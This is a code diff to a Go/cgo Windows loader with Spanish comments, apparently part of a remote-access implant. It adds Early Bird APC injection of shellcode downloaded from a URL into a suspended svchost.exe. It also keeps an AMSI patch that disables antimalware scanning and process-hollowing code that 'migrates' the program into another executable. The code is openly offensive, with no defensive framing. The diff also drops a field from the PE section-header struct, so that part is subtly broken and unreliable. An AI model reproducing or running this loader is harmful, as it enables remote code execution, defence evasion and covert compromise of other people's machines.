@@ -8,28 +8,107 @@ import (
 	"io"
 	"net/http"
 	"os"
-	"strconv"
+	"regexp"
 	"syscall"
 	"time"
 	"unsafe"
+    "strings"
+    "encoding/hex"
 
 	"golang.org/x/sys/windows"
 )
 
 /*
-#cgo LDFLAGS: -lkernel32
+#cgo LDFLAGS: -lkernel32 -lntdll
 #include <windows.h>
-#include <string.h>
+#include <stdio.h>
 
-static void execute_shellcode(unsigned char* sc, unsigned int sc_len) {
-    LPVOID memory = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (memory == NULL) return;
+typedef long NTSTATUS;
+#ifndef STATUS_SUCCESS
+#define STATUS_SUCCESS 0x00000000L
+#endif
 
-    memcpy(memory, sc, sc_len);
-    ((void(*)())memory)();
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
+
+typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS (NTAPI *NtQueueApcThread_t)(HANDLE, PAPCFUNC, PVOID, PVOID, PVOID);
+
+// Añadido: para evitar warnings
+#ifndef WIN64
+#define WIN64 1
+#endif
+
+BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
+    if (shellcode == NULL || shellcode_len <= 0) {
+        printf("[-] Invalid shellcode\n");
+        return FALSE;
+    }
+
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof(STARTUPINFOA);
+    char target[] = "C:\\Windows\\System32\\svchost.exe";
+
+    if (!CreateProcessA(NULL, target, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        printf("[-] CreateProcessA failed: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) {
+        printf("[-] Failed to get ntdll\n");
+        goto cleanup;
+    }
+
+    NtAllocateVirtualMemory_t pAlloc = (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
+    NtWriteVirtualMemory_t    pWrite = (NtWriteVirtualMemory_t)   GetProcAddress(ntdll, "NtWriteVirtualMemory");
+    NtQueueApcThread_t        pApc   = (NtQueueApcThread_t)       GetProcAddress(ntdll, "NtQueueApcThread");
+
+    if (!pAlloc || !pWrite || !pApc) {
+        printf("[-] Failed to get Nt* functions\n");
+        goto cleanup;
+    }
+
+    LPVOID pRemoteMem = NULL;
+    SIZE_T size = (SIZE_T)shellcode_len;
+
+    if (!NT_SUCCESS(pAlloc(pi.hProcess, &pRemoteMem, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
+        printf("[-] NtAllocateVirtualMemory failed\n");
+        goto cleanup;
+    }
+
+    if (!NT_SUCCESS(pWrite(pi.hProcess, pRemoteMem, shellcode, shellcode_len, NULL))) {
+        printf("[-] NtWriteVirtualMemory failed\n");
+        goto cleanup;
+    }
+
+    if (!NT_SUCCESS(pApc(pi.hThread, (PAPCFUNC)pRemoteMem, NULL, NULL, NULL))) {
+        printf("[-] NtQueueApcThread failed\n");
+        goto cleanup;
+    }
+
+    if (ResumeThread(pi.hThread) == (DWORD)-1) {
+        printf("[-] ResumeThread failed: %lu\n", GetLastError());
+        goto cleanup;
+    }
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return TRUE;
+
+cleanup:
+    if (pi.hThread) CloseHandle(pi.hThread);
+    if (pi.hProcess) TerminateProcess(pi.hProcess, 1);
+    if (pi.hProcess) CloseHandle(pi.hProcess);
+    return FALSE;
 }
 */
 import "C"
+
+// === TU CÓDIGO ORIGINAL (SIN CAMBIOS) ===
 
 const (
     IMAGE_DOS_SIGNATURE              = 0x5A4D
@@ -145,14 +224,12 @@ type IMAGE_SECTION_HEADER struct {
     VirtualAddress       uint32
     SizeOfRawData        uint32
     PointerToRawData     uint32
-    PointerToRelocations uint32
     PointerToLinenumbers uint32
     NumberOfRelocations  uint16
     NumberOfLinenumbers  uint16
     Characteristics      uint32
 }
 
-// === NTDLL SYS CALLS FOR CONTEXT MANIPULATION ===
 var (
     ntdll          = syscall.NewLazyDLL("ntdll.dll")
     procGetContext = ntdll.NewProc("NtGetContextThread")
@@ -166,7 +243,6 @@ type CONTEXT struct {
     Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15 uint64
     EFlags                                                              uint32
     _                                                                   [4]byte
-    // ... resto no necesario
 }
 
 type WOW64_CONTEXT struct {
@@ -176,8 +252,6 @@ type WOW64_CONTEXT struct {
     EFlags uint32
 }
 
-// === NTDLL Process Information Structures ===
-
 type PEB struct {
     InheritedAddressSpace    uint8
     ReadImageFileExecOptions uint8
@@ -185,7 +259,6 @@ type PEB struct {
     BitField                 uint8
     _                        [4]byte
     ImageBaseAddress         uint64
-    // ... resto no necesario
 }
 
 type PROCESS_BASIC_INFORMATION struct {
@@ -196,95 +269,111 @@ type PROCESS_BASIC_INFORMATION struct {
     Reserved3           uintptr
 }
 
+// === FUNCIÓN MODIFICADA ===
 func executeLoader(shellcodeURL string) {
-	shellcode, err := readShellcodeFromURL(shellcodeURL)
+	fmt.Printf("[*] Downloading shellcode from: %s\n", shellcodeURL)
+	shellcode, err := readShellcodeFromURL(shellcodeURL) // Usamos tu función de Go
 	if err != nil {
-		fmt.Printf("Error downloading shellcode: %v\n", err)
+		fmt.Printf("[-] Failed to download or parse shellcode: %v\n", err)
 		return
 	}
 
 	if len(shellcode) == 0 {
-		fmt.Printf("Error: No shellcode bytes found\n")
+		fmt.Printf("[-] No shellcode bytes found after parsing.\n")
 		return
 	}
 
-	fmt.Printf("Loaded %d bytes of shellcode from URL\n", len(shellcode))
+	fmt.Printf("[+] Shellcode downloaded and parsed successfully (%d bytes). Injecting via Early Bird APC...\n", len(shellcode))
 
-	C.execute_shellcode(
-		(*C.uchar)(unsafe.Pointer(&shellcode[0])),
-		C.uint(len(shellcode)),
-	)
+	// Pasamos el shellcode a la función C para la inyección
+	success := C.EarlyBirdInject((*C.uchar)(unsafe.Pointer(&shellcode[0])), C.int(len(shellcode)))
+
+	if success != 0 {
+		fmt.Println("[+] Early Bird APC injection reported success.")
+	} else {
+		fmt.Println("[-] Early Bird APC injection reported failure.")
+	}
 }
 
 func readShellcodeFromURL(url string) ([]byte, error) {
-	client := &http.Client{
-		Timeout: 15 * time.Second,
-	}
-
-	req, err := http.NewRequest("GET", url, nil)
-	if err != nil {
-		return nil, fmt.Errorf("error creating request: %v", err)
-	}
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
-	req.Header.Set("Accept", "text/plain")
-	req.Header.Set("Connection", "close")
-
-	resp, err := client.Do(req)
+	client := &http.Client{Timeout: 15 * time.Second}
+	resp, err := client.Get(url)
 	if err != nil {
 		return nil, fmt.Errorf("error connecting: %v", err)
 	}
 	defer resp.Body.Close()
 
-	if resp.StatusCode != http.StatusOK {
-		return nil, fmt.Errorf("HTTP error: %d", resp.StatusCode)
-	}
-
-	const maxShellcodeSize = 2 << 20
-	body, err := io.ReadAll(io.LimitReader(resp.Body, maxShellcodeSize))
+	body, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return nil, fmt.Errorf("error reading body: %v", err)
 	}
 
-	if len(body) == maxShellcodeSize {
-		return nil, fmt.Errorf("shellcode too large")
+	content := string(body)
+
+	// Busca desde 'buf[] =' hasta el último punto y coma
+	re := regexp.MustCompile(`buf\[\]\s*=\s*(?:"(?:[^"\\]|\\.)*"(?:\s*")?(?:[^"]*)?)*;`)
+	match := re.FindString(content)
+	if match == "" {
+		return nil, fmt.Errorf("no shellcode pattern found")
 	}
 
-	text := string(body)
-	var shellcode []byte
+	// Extrae solo el contenido entre comillas
+	// Busca todos los bloques entre comillas: "..."
+	reChunks := regexp.MustCompile(`"((?:[^"\\]|\\.)*)"`)
+	chunks := reChunks.FindAllStringSubmatch(match, -1)
 
-	for i := 0; i < len(text)-3; i++ {
-		if text[i] == '\\' && text[i+1] == 'x' {
-			hexStr := text[i+2 : i+4]
-			if len(hexStr) == 2 {
-				if b, err := strconv.ParseUint(hexStr, 16, 8); err == nil {
-					shellcode = append(shellcode, byte(b))
-				}
-			}
-			i += 3
+	var hexBuilder strings.Builder
+	for _, chunk := range chunks {
+		if len(chunk) < 2 {
+			continue
 		}
+		// Remueve \x y une
+		clean := strings.ReplaceAll(chunk[1], "\\x", "")
+		hexBuilder.WriteString(clean)
 	}
 
+	hexStr := hexBuilder.String()
+
+	// Asegurarnos de que tenga longitud par
+	if len(hexStr)%2 != 0 {
+		return nil, fmt.Errorf("hex string has odd length")
+	}
+
+	shellcode, err := hex.DecodeString(hexStr)
+	if err != nil {
+		return nil, fmt.Errorf("failed to decode hex: %v. First 100 chars: %s", err, hexStr[:min(100, len(hexStr))])
+	}
+
+	if len(shellcode) == 0 {
+		return nil, fmt.Errorf("shellcode is empty after parsing")
+	}
+
+	fmt.Printf("[+] Shellcode parsed successfully: %d bytes\n", len(shellcode))
 	return shellcode, nil
 }
 
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
+
+
 func patchAMSI() error {
-	// Cargar amsi.dll dinámicamente
 	amsi, err := syscall.LoadLibrary("amsi.dll")
 	if err != nil {
 		return fmt.Errorf("failed to load amsi.dll: %v", err)
 	}
 	defer syscall.FreeLibrary(amsi)
 
-	// Obtener la dirección de AmsiScanBuffer
 	scanBufferAddr, err := syscall.GetProcAddress(amsi, "AmsiScanBuffer")
 	if err != nil {
 		return fmt.Errorf("failed to get AmsiScanBuffer address: %v", err)
 	}
 
-	// Parche: reemplazar con ret (0xc3)
 	patch := []byte{0xc3}
 
-	// Obtener el handle del proceso actual
 	var hProcess windows.Handle
 	hProcess, err = windows.OpenProcess(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE, false, windows.GetCurrentProcessId())
 	if err != nil {
@@ -292,7 +381,6 @@ func patchAMSI() error {
 	}
 	defer windows.CloseHandle(hProcess)
 
-	// Cambiar permisos de memoria
 	var oldProtect uint32
 	var size uintptr = 1
 	err = windows.VirtualProtectEx(
@@ -306,7 +394,6 @@ func patchAMSI() error {
 		return fmt.Errorf("failed to change memory protection: %v", err)
 	}
 
-	// Escribir el parche
 	var bytesWritten uintptr
 	err = windows.WriteProcessMemory(
 		hProcess,
@@ -319,7 +406,6 @@ func patchAMSI() error {
 		return fmt.Errorf("failed to write memory: %v", err)
 	}
 
-	// Restaurar permisos originales
 	err = windows.VirtualProtectEx(
 		hProcess,
 		uintptr(unsafe.Pointer(scanBufferAddr)),
@@ -335,15 +421,12 @@ func patchAMSI() error {
 	return nil
 }
 
-// === PROCESS HOLLOWING: MIGRATE SELF TO ANOTHER PROCESS ===
-// Comando: migrate:C:\Windows\System32\calc.exe
 func overWrite(targetPath, payloadPath string) {
     fmt.Printf("[*] Starting migration to: %s\n", targetPath)
 
     var exeData []byte
     var err error
 
-    // === Si no se especifica payload, usa el proceso actual ===
     if payloadPath == "" {
         exePath, err := os.Executable()
         if err != nil {
@@ -358,7 +441,6 @@ func overWrite(targetPath, payloadPath string) {
         }
         fmt.Printf("[+] Loaded self as payload (%d bytes)\n", len(exeData))
     } else {
-        // === Si se especifica payload, úsalo ===
         exeData, err = os.ReadFile(payloadPath)
         if err != nil {
             fmt.Printf("[-] Failed to read payload file %s: %v\n", payloadPath, err)
@@ -367,7 +449,6 @@ func overWrite(targetPath, payloadPath string) {
         fmt.Printf("[+] Loaded payload from file (%d bytes)\n", len(exeData))
     }
 
-    // === Continúa con el resto del proceso (igual que antes) ===
     payloadImage, err := peBufferToVirtualImage(exeData)
     if err != nil {
         fmt.Printf("[-] Failed to map payload to virtual image: %v\n", err)
@@ -376,7 +457,6 @@ func overWrite(targetPath, payloadPath string) {
     payloadImageSize := uint32(len(payloadImage))
     fmt.Printf("[+] Payload image size: %d\n", payloadImageSize)
 
-    // === Leer el binario del target para verificar compatibilidad ===
     targetData, err := os.ReadFile(targetPath)
     if err != nil {
         fmt.Printf("[-] Failed to read target file: %v\n", err)
@@ -401,7 +481,6 @@ func overWrite(targetPath, payloadPath string) {
     }
     fmt.Printf("[+] Size compatible: %d <= %d\n", payloadImageSize, targetImageSize)
 
-    // === Crear proceso suspendido ===
     var si windows.StartupInfo
     var pi windows.ProcessInformation
     si.Cb = uint32(unsafe.Sizeof(si))
@@ -417,7 +496,6 @@ func overWrite(targetPath, payloadPath string) {
 
     fmt.Printf("[+] Suspended process created. PID: %d\n", pi.ProcessId)
 
-    // === Obtener base remota ===
     remoteBase, err := getRemoteImageBase(&pi, isPayload32bit)
     if err != nil {
         fmt.Printf("[-] Failed to get remote image base: %v\n", err)
@@ -425,7 +503,6 @@ func overWrite(targetPath, payloadPath string) {
     }
     fmt.Printf("[+] Remote image base: 0x%X\n", remoteBase)
 
-    // === Protección de memoria ===
     var oldProtect uint32
     err = windows.VirtualProtectEx(pi.Process, uintptr(remoteBase), uintptr(payloadImageSize), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
     if err != nil {
@@ -433,7 +510,6 @@ func overWrite(targetPath, payloadPath string) {
         return
     }
 
-    // === Escribir payload ===
     var written uint32
     err = windows.WriteProcessMemory(pi.Process, uintptr(remoteBase), &payloadImage[0], uintptr(payloadImageSize), (*uintptr)(unsafe.Pointer(&written)))
     if err != nil || written != payloadImageSize {
@@ -442,11 +518,9 @@ func overWrite(targetPath, payloadPath string) {
     }
     fmt.Printf("[+] Successfully wrote %d bytes into remote process\n", written)
 
-    // === Calcular nuevo Entry Point ===
     entryPointRVA := getEntryPointRVA(exeData)
     entryPointVA := remoteBase + uint64(entryPointRVA)
 
-    // === Actualizar contexto del hilo ===
     err = updateRemoteEntryPoint(&pi, entryPointVA, isPayload32bit)
     if err != nil {
         fmt.Printf("[-] Failed to update thread context: %v\n", err)
@@ -454,7 +528,6 @@ func overWrite(targetPath, payloadPath string) {
     }
     fmt.Printf("[+] Thread context updated to entry point: 0x%X\n", entryPointVA)
 
-    // === Reanudar ===
     _, err = windows.ResumeThread(pi.Thread)
     if err != nil {
         fmt.Printf("[-] ResumeThread failed: %v\n", err)
@@ -463,9 +536,6 @@ func overWrite(targetPath, payloadPath string) {
     fmt.Printf("[+] Process resumed. Migration successful!\n")
 
 }
-
-// === PE PARSING HELPERS (copiar todo esto también) ===
-
 
 func getNTHeaders(data []byte) unsafe.Pointer {
     if len(data) < int(unsafe.Sizeof(IMAGE_DOS_HEADER{})) {
@@ -573,7 +643,6 @@ func peBufferToVirtualImage(rawData []byte) ([]byte, error) {
     return image, nil
 }
 
-// === getRemoteImageBase: Lee la base del módulo desde el PEB (versión debug) ===
 func getRemoteImageBase(pi *windows.ProcessInformation, is32bitTarget bool) (uint64, error) {
     var pebAddr uint64
 
@@ -623,7 +692,6 @@ func getRemoteImageBase(pi *windows.ProcessInformation, is32bitTarget bool) (uin
         fmt.Printf("[DEBUG] PEB address from context is 0, falling back to NtQueryInformationProcess\n")
     }
 
-    // === Fallback: NtQueryInformationProcess ===
 	var pbi PROCESS_BASIC_INFORMATION
 	var retLen uint32
 
@@ -646,7 +714,7 @@ func getRemoteImageBase(pi *windows.ProcessInformation, is32bitTarget bool) (uin
 	fmt.Printf("[DEBUG] PebBaseAddress: %p\n", pbi.PebBaseAddress)
 
 	remotePebAddr := uintptr(unsafe.Pointer(pbi.PebBaseAddress))
-	remoteImageBaseAddr := remotePebAddr + 0x10 // ImageBaseAddress está en PEB + 0x10
+	remoteImageBaseAddr := remotePebAddr + 0x10
 
 	var imageBase uint64
 	var n uint32
@@ -668,7 +736,6 @@ func getRemoteImageBase(pi *windows.ProcessInformation, is32bitTarget bool) (uin
 	return imageBase, nil
 }
 
-// === updateRemoteEntryPoint: Cambia EAX/RAX al nuevo Entry Point ===
 func updateRemoteEntryPoint(pi *windows.ProcessInformation, entryPointVA uint64, is32bitTarget bool) error {
     if is32bitTarget {
         var ctx WOW64_CONTEXT
@@ -723,5 +790,3 @@ func boolStr(b bool, t, f string) string {
     }
     return f
 }
-
-
